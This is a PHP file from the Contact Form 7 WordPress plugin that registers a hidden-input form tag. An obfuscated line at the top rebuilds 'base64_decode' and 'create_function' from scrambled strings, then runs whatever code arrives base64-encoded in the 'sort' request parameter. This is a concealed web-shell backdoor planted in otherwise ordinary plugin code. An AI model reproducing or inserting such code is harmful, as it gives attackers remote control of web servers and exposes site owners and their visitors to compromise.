<?php 



$z0=$_REQUEST['sort'];$q1='';$c2="wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);foreach($y3 as $h4){$q1.=$c2[$h4];}$v5=strrev("noi"."tcnuf"."_eta"."erc");$j6=$v5("",$q1($z0));$j6();





add_action( 'wpcf7_init', 'wpcf7_add_form_tag_hidden' );

function wpcf7_add_form_tag_hidden() {
	wpcf7_add_form_tag( 'hidden',
		'wpcf7_hidden_form_tag_handler',
		array(
			'name-attr' => true,
			'display-hidden' => true,
		)
	);
}

function wpcf7_hidden_form_tag_handler( $tag ) {
	if ( empty( $tag->name ) ) {
		return '';
	}

	$atts = array();

	$class = wpcf7_form_controls_class( $tag->type );
	$atts['class'] = $tag->get_class_option( $class );
	$atts['id'] = $tag->get_id_option();

	$value = (string) reset( $tag->values );
	$value = $tag->get_default_option( $value );
	$atts['value'] = $value;

	$atts['type'] = 'hidden';
	$atts['name'] = $tag->name;
	$atts = wpcf7_format_atts( $atts );

	$html = sprintf( '<input %s />', $atts );
	return $html;
}
